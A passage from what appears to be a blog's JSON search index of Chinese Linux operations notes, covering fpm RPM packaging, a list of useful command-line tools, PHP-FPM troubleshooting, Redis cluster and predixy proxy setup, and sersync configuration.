","date":"2022-06-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/:1:13","tags":["linux"],"title":"常用重定向及解释","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/"},{"categories":["linux","运维记事"],"content":"定制rpm包","date":"2022-06-23","objectID":"/posts/linux/%E5%AE%9A%E5%88%B6rpm%E5%8C%85/","tags":["linux","fpm","rpm","解决方案"],"title":"定制rpm包","uri":"/posts/linux/%E5%AE%9A%E5%88%B6rpm%E5%8C%85/"},{"categories":["linux","运维记事"],"content":" 本文参照以下引用实践编写 https://www.zyops.com/autodeploy-rpm/ ","date":"2022-06-23","objectID":"/posts/linux/%E5%AE%9A%E5%88%B6rpm%E5%8C%85/:0:0","tags":["linux","fpm","rpm","解决方案"],"title":"定制rpm包","uri":"/posts/linux/%E5%AE%9A%E5%88%B6rpm%E5%8C%85/"},{"categories":["linux","运维记事"],"content":"1. FPM 打包工具 FPM的作者是jordansissel FPM的github： https://github.com/jordansissel/fpm FPM功能简单说就是将一种类型的包转换成另一种类型，其具体工功能实现实际上是对于rpmbuild命令的一个封装 ","date":"2022-06-23","objectID":"/posts/linux/%E5%AE%9A%E5%88%B6rpm%E5%8C%85/:1:0","tags":["linux","fpm","rpm","解决方案"],"title":"定制rpm包","uri":"/posts/linux/%E5%AE%9A%E5%88%B6rpm%E5%8C%85/"},{"categories":["linux","运维记事"],"content":"1.1. 支持的源类型包 1. dir 将目录打包成所需要的类型，可以用于源码编译安装的软件包 2. rpm 对rpm进行转换 3. gem 对rubygem包进行转换 4. python 将python模块打包成相应的类型 ","date":"2022-06-23","objectID":"/posts/linux/%E5%AE%9A%E5%88%B6rpm%E5%8C%85/:2:0","tags":["linux","fpm","rpm","解决方案"],"title":"定制rpm包","uri":"/posts/linux/%E5%AE%9A%E5%88%B6rpm%E5%8C%85/"},{"categories":["linux","运维记事"],"content":"1.2. 支持的目标类型包 1. rpm 转换为rpm包 2. deb 转换为deb包 3. solaris 转换为solaris包 4. puppet 转换为puppet模块 ","date":"2022-06-23","objectID":"/posts/linux/%E5%AE%9A%E5%88%B6rpm%E5%8C%85/:3:0","tags":["linux","fpm","rpm","解决方案"],"title":"定制rpm包","uri":"/posts/linux/%E5%AE%9A%E5%88%B6rpm%E5%8C%85/"},{"categories":["linux","运维记事"],"content":"1.3. FPM安装 # fpm是ruby写的，因此系统环境需要ruby，且ruby版本号大于1.8.5。 # 安装ruby模块 yum -y install ruby rubygems ruby-devel # 查看当前使用的rubygems仓库 gem sources list # 添加阿里云的Rubygems仓库，外国的源慢，移除原生的Ruby仓库 gem sources --add http://mirrors.aliyun.com/rubygems/ --remove http://rubygems.org/ # 安装fpm，gem从rubygem仓库安装软件类似yum从yum仓库安装软件。首先安装低版本的json，高版本的json需要ruby2.0以上，然后安装低版本的fpm，够用。 gem install json -v 1.8.3 gem install fpm -v 1.3.3 # 上面的2步安装仅适合CentOS6系统，CentOS7系统一步搞定，即gem install fpm ","date":"2022-06-23","objectID":"/posts/linux/%E5%AE%9A%E5%88%B6rpm%E5%8C%85/:4:0","tags":["linux","fpm","rpm","解决方案"],"title":"定制rpm包","uri":"/posts/linux/%E5%AE%9A%E5%88%B6rpm%E5%8C%85/"},{"categories":["linux","运维记事"],"content":"1.4. FPM参数 详细使用见fpm –help 常用参数 -s 指定源类型 -t 指定目标类型，即想要制作为什么包 -n 指定包的名字 -v 指定包的版本号 -C 指定打包的相对路径 Change directory to here before searching forfiles -d 指定依赖于哪些包 -f 第二次打包时目录下如果有同名安装包存在，则覆盖它 -p 输出的安装包的目录，不想放在当前目录下就需要指定 --post-install 软件包安装完成之后所要运行的脚本；同--after-install --pre-install 软件包安装完成之前所要运行的脚本；同--before-install --post-uninstall 软件包卸载完成之后所要运行的脚本；同--after-remove --pre-uninstall 软件包卸载完成之前所要运行的脚本；同--before-remove ","date":"2022-06-23","objectID":"/posts/linux/%E5%AE%9A%E5%88%B6rpm%E5%8C%85/:5:0","tags":["linux","fpm","rpm","解决方案"],"title":"定制rpm包","uri":"/posts/linux/%E5%AE%9A%E5%88%B6rpm%E5%8C%85/"},{"categories":["linux","运维记事"],"content":"2. 使用实例–实战定制nginx的RPM包 ","date":"2022-06-23","objectID":"/posts/linux/%E5%AE%9A%E5%88%B6rpm%E5%8C%85/:6:0","tags":["linux","fpm","rpm","解决方案"],"title":"定制rpm包","uri":"/posts/linux/%E5%AE%9A%E5%88%B6rpm%E5%8C%85/"},{"categories":["linux","运维记事"],"content":"2.1. 安装nginx ","date":"2022-06-23","objectID":"/posts/linux/%E5%AE%9A%E5%88%B6rpm%E5%8C%85/:7:0","tags":["linux","fpm","rpm","解决方案"],"title":"定制rpm包","uri":"/posts/linux/%E5%AE%9A%E5%88%B6rpm%E5%8C%85/"},{"categories":["linux","运维记事"],"content":"2.2. 定制rpm安装后(前)执行脚本 [root@00 ~]# vim /opt/sh/nginx.rpm.sh #!/bin/bash # 指定但不创建主目录是为了规划ftp虚拟帐号用的 useradd nginx -M -s /sbin/nologin -d /var/ftproot ln -s /opt/nginx-1.14.2/ /opt/nginxssl ","date":"2022-06-23","objectID":"/posts/linux/%E5%AE%9A%E5%88%B6rpm%E5%8C%85/:8:0","tags":["linux","fpm","rpm","解决方案"],"title":"定制rpm包","uri":"/posts/linux/%E5%AE%9A%E5%88%B6rpm%E5%8C%85/"},{"categories":["linux","运维记事"],"content":"2.3. 打包 [root@00 ~]# fpm -s dir -t rpm --description 'nginx' -n nginx -v 1.14.2 -d 'pcre-devel,openssl-devel' --post-install /opt/sh/nginx.rpm.sh -C /opt/nginx-1.6.2/ -f /opt/nginx-1.6.2/ # 安装好的，复制完整结构内容到一个目录，打包那个目录内的内容是一样的效果 # such as: fpm -s dir -t rpm --description \"badvpn binary for fc32, Source: https://github.com/ambrop72/badvpn \" --rpm-summary 'badvpn' --url 'https://tools.0x5c0f.cc' --license '3-clause BSD license' --iteration fc32 -m 0x5c0f --vendor mail@0x5c0f.cc -n badvpn -v '1.999.130-v1.0' -C . # no value for epoch is set, defaulting to nil {:level=\u003e:warn} no value for epoch is set, defaulting to nil {:level=\u003e:warn} Created package {:path=\u003e\"nginx-1.14.2-1.x86_64.rpm\"} [root@oldboy ~]# ll -h nginx-1.14.2-1.x86_64.rpm -rw-r--r-- 1 root root 6.7M Nov 1 10:02 nginx-1.14.2-1.x86_64.rpm ","date":"2022-06-23","objectID":"/posts/linux/%E5%AE%9A%E5%88%B6rpm%E5%8C%85/:9:0","tags":["linux","fpm","rpm","解决方案"],"title":"定制rpm包","uri":"/posts/linux/%E5%AE%9A%E5%88%B6rpm%E5%8C%85/"},{"categories":["linux","那些有用没用的"],"content":"收集的一些感觉挺好用的工具","date":"2022-06-23","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/","tags":["linux"],"title":"那些好用的工具收集","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/"},{"categories":["linux","那些有用没用的"],"content":"1. 文件内容搜索工具(ag) # 类似于grep [root@01 ~]# yum install the_silver_searcher [root@01 ~]# ag \"hello\" ./example ","date":"2022-06-23","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:1:0","tags":["linux"],"title":"那些好用的工具收集","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/"},{"categories":["linux","那些有用没用的"],"content":"2. mysql 命令补全工具，可替代mysql命令 https://github.com/dbcli [root@01 ~]# pip install -U mycli [root@01 ~]# mycli ","date":"2022-06-23","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:2:0","tags":["linux"],"title":"那些好用的工具收集","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/"},{"categories":["linux","那些有用没用的"],"content":"3. 多线程下载工具(axel) [root@01 ~]# yum install axel [root@01 ~]# axel -n 10 http(ftp)://example.com/example.iso ","date":"2022-06-23","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:3:0","tags":["linux"],"title":"那些好用的工具收集","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/"},{"categories":["linux","那些有用没用的"],"content":"4. 终端命令补全 [root@01 ~]# yum install bash-completion -y ","date":"2022-06-23","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:4:0","tags":["linux"],"title":"那些好用的工具收集","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/"},{"categories":["linux","那些有用没用的"],"content":"5. linux 硬件查看神器 [root@01 ~]# yum install inxi -y ","date":"2022-06-23","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:5:0","tags":["linux"],"title":"那些好用的工具收集","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/"},{"categories":["linux","那些有用没用的"],"content":"6. linux Script 终端记录神器 https://asciinema.org/ [root@01 ~]# pip3 install asciinema ","date":"2022-06-23","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:6:0","tags":["linux"],"title":"那些好用的工具收集","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/"},{"categories":["linux","那些有用没用的"],"content":"7. linux 文件加密与解密工具 https://linux.cn/article-10632-1.html [root@01 ~]# wget -O /usr/local/bin/toplip https://2ton.com.au/standalone_binaries/toplip \u0026\u0026 chmod +x /usr/local/bin/toplip ","date":"2022-06-23","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:7:0","tags":["linux"],"title":"那些好用的工具收集","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/"},{"categories":["linux","那些有用没用的"],"content":"8. zenity - display GTK+ dialogs( 图形界面操纵工具 ) $\u003e zenity --help ","date":"2022-06-23","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:8:0","tags":["linux"],"title":"那些好用的工具收集","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/"},{"categories":["linux","那些有用没用的"],"content":"9. 系统性能监控和故障诊断工具 sysdig ## fedora 下，新版已经不支持 dkms,使用需要使用 --modern-bpf ## https://github.com/draios/sysdig/issues/2035 # 网络宽带占用 $\u003e sysdig -c topprocs_net # CPU 占用 $\u003e sysdig -c topprocs_cpu # 读写量最大的文件 $\u003e sysdig -c topfiles_bytes # 查看容器相关资源使用状态 $\u003e csysdig -vcontainers ","date":"2022-06-23","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:9:0","tags":["linux"],"title":"那些好用的工具收集","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/"},{"categories":["linux","那些有用没用的"],"content":"10. 终端文件管理工具，支持文件预览 yazi https://github.com/sxyazi/yazi ","date":"2022-06-23","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:10:0","tags":["linux"],"title":"那些好用的工具收集","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/"},{"categories":["linux","那些有用没用的"],"content":"11. Linux 下 TCP/UDP 端口转发工具 https://github.com/samhocevar/rinetd ","date":"2022-06-23","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:11:0","tags":["linux"],"title":"那些好用的工具收集","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/"},{"categories":["linux","那些有用没用的"],"content":"12. Linux 下好用的剪贴板管理工具 copyq [root@01 ~]# sudo dnf install -y copyq ","date":"2022-06-23","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:12:0","tags":["linux"],"title":"那些好用的工具收集","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"Php运维故障记录","date":"2022-06-22","objectID":"/posts/linux/php%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/","tags":["linux","php","解决方案"],"title":"Php运维故障记录","uri":"/posts/linux/php%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"1. PHP message: PHP Fatal error: Allowed memory size of 134217728 bytes exhausted, 修改 php.ini # memory_limit = 128M # 默认 # memory_limit = -1 # 代表无限制 memory_limit = 256M # 一个线程的最大内存使用量，即一个Web请求可使用的PHP内存量。 # 完成后重启nginx即可 ","date":"2022-06-22","objectID":"/posts/linux/php%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:1:0","tags":["linux","php","解决方案"],"title":"Php运维故障记录","uri":"/posts/linux/php%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"2. request_terminate_timeout的值如果设置为0或者过长的时间，可能会引起file_get_contents的资源问题。 http://www.cnblogs.com/argb/p/3604340.html 如果file_get_contents请求的远程资源如果反应过慢，file_get_contents就会一直卡在那里不会超时。我们知道php.ini 里面max_execution_time 可以设置 PHP 脚本的最大执行时间，但是，在 php-cgi(php-fpm) 中，该参数不会起效。真正能够控制 PHP 脚本最大执行时间的是 php-fpm.conf 配置文件中的request_terminate_timeout参数。 request_terminate_timeout默认值为 0 秒，也就是说，PHP 脚本会一直执行下去。这样，当所有的 php-cgi 进程都卡在 file_get_contents() 函数时，这台 Nginx+PHP 的 WebServer 已经无法再处理新的 PHP 请求了，Nginx 将给用户返回“502 Bad Gateway”。修改该参数，设置一个 PHP 脚本最大执行时间是必要的，但是，治标不治本。例如改成 30s，如果发生 file_get_contents() 获取网页内容较慢的情况，这就意味着 150 个 php-cgi 进程，每秒钟只能处理 5 个请求，WebServer 同样很难避免”502 Bad Gateway”。解决办法是request_terminate_timeout设置为10s或者一个合理的值，或者给file_get_contents加一个超时参数。 $ctx = stream_context_create(array( 'http' =\u003e array( 'timeout' =\u003e 10 //设置一个超时时间，单位为秒 ) )); file_get_contents($str, 0, $ctx); ","date":"2022-06-22","objectID":"/posts/linux/php%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:2:0","tags":["linux","php","解决方案"],"title":"Php运维故障记录","uri":"/posts/linux/php%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"3. max_requests参数配置不当，可能会引起间歇性502错误(转) pm.max_requests = 1000 设置每个子进程重生之前服务的请求数. 对于可能存在内存泄漏的第三方模块来说是非常有用的. 如果设置为 ’0′ 则一直接受请求. 等同于 PHP_FCGI_MAX_REQUESTS 环境变量. 默认值: 0. 这段配置的意思是，当一个 PHP-CGI 进程处理的请求数累积到 500 个后，自动重启该进程。 但是为什么要重启进程呢？ 一般在项目中，我们多多少少都会用到一些 PHP 的第三方库，这些第三方库经常存在内存泄漏问题，如果不定期重启 PHP-CGI 进程，势必造成内存使用量不断增长。因此 PHP-FPM 作为 PHP-CGI 的管理器，提供了这么一项监控功能，对请求达到指定次数的 PHP-CGI 进程进行重启，保证内存使用量不增长。 正是因为这个机制，在高并发的站点中，经常导致 502 错误，我猜测原因是 PHP-FPM 对从 NGINX 过来的请求队列没处理好。不过我目前用的还是 PHP 5.3.2，不知道在 PHP 5.3.3 中是否还存在这个问题。 目前我们的解决方法是，把这个值尽量设置大些，尽可能减少 PHP-CGI 重新 SPAWN 的次数，同时也能提高总体性能。在我们自己实际的生产环境中发现，内存泄漏并不明显，因此我们将这个值设置得非常大（204800）。大家要根据自己的实际情况设置这个值，不能盲目地加大。 话说回来，这套机制目的只为保证 PHP-CGI 不过分地占用内存，为何不通过检测内存的方式来处理呢？我非常认同高春辉所说的，通过设置进程的峰值内在占用量来重启 PHP-CGI 进程，会是更好的一个解决方案。 ","date":"2022-06-22","objectID":"/posts/linux/php%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:3:0","tags":["linux","php","解决方案"],"title":"Php运维故障记录","uri":"/posts/linux/php%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"4. php-fpm的慢日志，debug及异常排查神器： request_slowlog_timeout设置一个超时的参数，slowlog设置慢日志的存放位置 tail -f /var/log/www.slow.log 上面的命令即可看到执行过慢的php过程。 大家可以看到经常出现的网络读取超过、Mysql查询过慢的问题，根据提示信息再排查问题就有很明确的方向了。 ","date":"2022-06-22","objectID":"/posts/linux/php%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:4:0","tags":["linux","php","解决方案"],"title":"Php运维故障记录","uri":"/posts/linux/php%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"Redis集群及redis代理predixy配置","date":"2022-06-22","objectID":"/posts/linux/redis%E9%9B%86%E7%BE%A4%E5%8F%8Aredis%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE/","tags":["linux","redis","解决方案"],"title":"Redis集群及redis代理配置","uri":"/posts/linux/redis%E9%9B%86%E7%BE%A4%E5%8F%8Aredis%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"1. 测试版本: redis 5.0.9 make PREFIX=/opt/redis-5.0.10 install mkdir -p /opt/redis-5.0.10/{data,logs,etc} ","date":"2022-06-22","objectID":"/posts/linux/redis%E9%9B%86%E7%BE%A4%E5%8F%8Aredis%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE/:1:0","tags":["linux","redis","解决方案"],"title":"Redis集群及redis代理配置","uri":"/posts/linux/redis%E9%9B%86%E7%BE%A4%E5%8F%8Aredis%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"1.1. 配置文件额外修改以下参数(多少个节点，多少个独立配置文件) masterauth 123456 # 与requirepass密码一致 cluster-enabled yes cluster-config-file /data/cacheDB/redis-server/etc/nodes-6370.conf cluster-node-timeout 15000 ","date":"2022-06-22","objectID":"/posts/linux/redis%E9%9B%86%E7%BE%A4%E5%8F%8Aredis%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE/:2:0","tags":["linux","redis","解决方案"],"title":"Redis集群及redis代理配置","uri":"/posts/linux/redis%E9%9B%86%E7%BE%A4%E5%8F%8Aredis%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"1.2. 启动 /data/cacheDB/redis-server/bin/redis-server /data/cacheDB/redis-server/etc/redis_6370.conf /data/cacheDB/redis-server/bin/redis-server /data/cacheDB/redis-server/etc/redis_6371.conf /data/cacheDB/redis-server/bin/redis-server /data/cacheDB/redis-server/etc/redis_6372.conf /data/cacheDB/redis-server/bin/redis-server /data/cacheDB/redis-server/etc/redis_6375.conf /data/cacheDB/redis-server/bin/redis-server /data/cacheDB/redis-server/etc/redis_6376.conf /data/cacheDB/redis-server/bin/redis-server /data/cacheDB/redis-server/etc/redis_6377.conf ","date":"2022-06-22","objectID":"/posts/linux/redis%E9%9B%86%E7%BE%A4%E5%8F%8Aredis%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE/:3:0","tags":["linux","redis","解决方案"],"title":"Redis集群及redis代理配置","uri":"/posts/linux/redis%E9%9B%86%E7%BE%A4%E5%8F%8Aredis%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"1.3. 激活集群连接 /data/cacheDB/redis-server/bin/redis-cli \\ --cluster create \\ 192.16.10.200:6371 \\ 192.16.10.200:6372 \\ 192.16.10.200:6373 \\ 192.16.10.201:6375 \\ 192.16.10.201:6376 \\ 192.16.10.201:6377 \\ --cluster-replicas 1 \\ -a 123456 # -cluster-replicas 1 从节点个数，以上为3主3从 ","date":"2022-06-22","objectID":"/posts/linux/redis%E9%9B%86%E7%BE%A4%E5%8F%8Aredis%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE/:4:0","tags":["linux","redis","解决方案"],"title":"Redis集群及redis代理配置","uri":"/posts/linux/redis%E9%9B%86%E7%BE%A4%E5%8F%8Aredis%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"1.4. redis 代理(一个服务器上部署，看需要部署多节点) https://juejin.im/post/6863701563685371917 yum install libstdc++-static gcc gcc-c++ -y git clone https://github.com/joyieldInc/predixy.git make MT=true cp -v ./conf/auth.conf /opt/redis-server/conf/auth.conf cp -v ./conf/cluster.conf /opt/redis-server/conf/cluster.conf cp -v ./conf/latency.conf /opt/redis-server/conf/latency.conf cp -v ./conf/predixy.conf /opt/redis-server/conf/predixy.conf cp -v ./src/predixy /opt/redis-server/bin/ ## /opt/redis-server/conf/predixy.conf # 修改指示节点名 Name Predixy_192.16.10.200 # 可以修改端口 Bind 192.16.10.200:6370 # 修改内容 Include try.conf # 为 Include cluster.conf ## /opt/redis-server/conf/auth.conf # 移除所有可写权限 # 设置管理权限密码为redis一致 # ## /opt/redis-server/conf/cluster.conf # 修改或添加内容为 ClusterServerPool { Password i4ZHIJNDYvndeZOh MasterReadPriority 60 StaticSlaveReadPriority 50 DynamicSlaveReadPriority 50 RefreshInterval 1 ServerTimeout 1 ServerFailureLimit 10 ServerRetryTimeout 1 KeepAlive 120 Servers { + 192.16.10.200:6371 + 192.16.10.200:6372 + 192.16.10.200:6373 + 192.16.10.201:6375 + 192.16.10.201:6376 + 192.16.10.201:6377 } } # 启动 /opt/redis-server/bin/predixy /opt/redis-server/conf/predixy.conf # 连接 /opt/redis-server/bin/redis-cli -h 172.16.80.31 -p 6370 ","date":"2022-06-22","objectID":"/posts/linux/redis%E9%9B%86%E7%BE%A4%E5%8F%8Aredis%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE/:5:0","tags":["linux","redis","解决方案"],"title":"Redis集群及redis代理配置","uri":"/posts/linux/redis%E9%9B%86%E7%BE%A4%E5%8F%8Aredis%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"Sersync实时同步工具","date":"2022-06-22","objectID":"/posts/linux/sersync%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7/","tags":["linux","同步","rsync"],"title":"Sersync实时同步工具","uri":"/posts/linux/sersync%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7/"},{"categories":["linux","运维记事"],"content":" 简介 一个可以实时同步的工具，但不能单独运行，需要配合rsync使用，相当于inotify+rsync,但是比他们效率更高，基于块复制。 ","date":"2022-06-22","objectID":"/posts/linux/sersync%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7/:0:0","tags":["linux","同步","rsync"],"title":"Sersync实时同步工具","uri":"/posts/linux/sersync%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7/"},{"categories":["linux","运维记事"],"content":"1.1. 程序说明 # 文件下载解压后实际上就只有两个文件 . └── GNU-Linux-x86 ├── confxml.xml └── sersync2 ","date":"2022-06-22","objectID":"/posts/linux/sersync%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7/:1:0","tags":["linux","同步","rsync"],"title":"Sersync实时同步工具","uri":"/posts/linux/sersync%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7/"},{"categories":["linux","运维记事"],"content":"1.2. 下载 # 代码更新地址 https://code.google.com/archive/p/sersync/downloads # 下载 wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/sersync/sersync2.5.4_64bit_binary_stable_final.tar.gz ","date":"2022-06-22","objectID":"/posts/linux/sersync%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7/:2:0","tags":["linux","同步","rsync"],"title":"Sersync实时同步工具","uri":"/posts/linux/sersync%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7/"},{"categories":["linux","运维记事"],"content":"1.3. 规划目录 mkdir -p /opt/sersync/{bin,logs,etc} cp ./GNU-Linux-x86/confxml.xml /opt/sersync/etc cp ./GNU-Linux-x86/sersync2 /opt/sersync/bin ","date":"2022-06-22","objectID":"/posts/linux/sersync%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7/:3:0","tags":["linux","同步","rsync"],"title":"Sersync实时同步工具","uri":"/posts/linux/sersync%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7/"},{"categories":["linux","运维记事"],"content":"1.4. 参数说明 ","date":"2022-06-22","objectID":"/posts/linux/sersync%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7/:4:0","tags":["linux","同步","rsync"],"title":"Sersync实时同步工具","uri":"/posts/linux/sersync%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7/"},{"categories":["linux","运维记事"],"content":"1.4.1. 主程序 [root@11 bin]# /opt/sersync/bin/sersync2 -h # 中文帮助文档，很清晰 set the system param execute：echo 50000000 \u003e /proc/sys/fs/inotify/max_user_watches execute：echo 327679 \u003e /proc/sys/fs/inotify/max_queued_events parse the command param _______________________________________________________ 参数-d:启用守护进程模式 参数-r:在监控前，将监控目录与远程主机用rsync命令推送一遍 c参数-n: 指定开启守护线程的数量，默认为10个 参数-o:指定配置文件，默认使用confxml.xml文件 参数-m:单独启用其他模块，使用 -m refreshCDN 开启刷新CDN模块 参数-m:单独启用其他模块，使用 -m socket 开启socket模块 参数-m:单独启用其他模块，使用 -m http 开启http模块 不加-m参数，则默认执行同步程序 ________________________________________________________________ ","date":"2022-06-22","objectID":"/posts/linux/sersync%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7/:4:1","tags":["linux","同步","rsync"],"title":"Sersync实时同步工具","uri":"/posts/linux/sersync%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7/"},{"categories":["linux","运维记事"],"content":"1.4.2. 配置文件 \u003c!-- 就是一个xml文件 --\u003e \u003c?xml version=\"1.0\" encoding=\"ISO-8859-1\"?\u003e \u003chead version=\"2.5\"\u003e \u003chost hostip=\"localhost\" port=\"8008\"\u003e\u003c/host\u003e \u003cdebug start=\"false\"/\u003e \u003cfileSystem xfs=\"false\"/\u003e \u003c!-- xfs 文件系统建议开启 --\u003e \u003cfilter start=\"false\"\u003e \u003c!-- start=\"true\" 开启排除文件,默认关闭,不过开启时第一次不能进行初始同步，可能是bug，也可能本身是这么设定的 --\u003e \u003cexclude 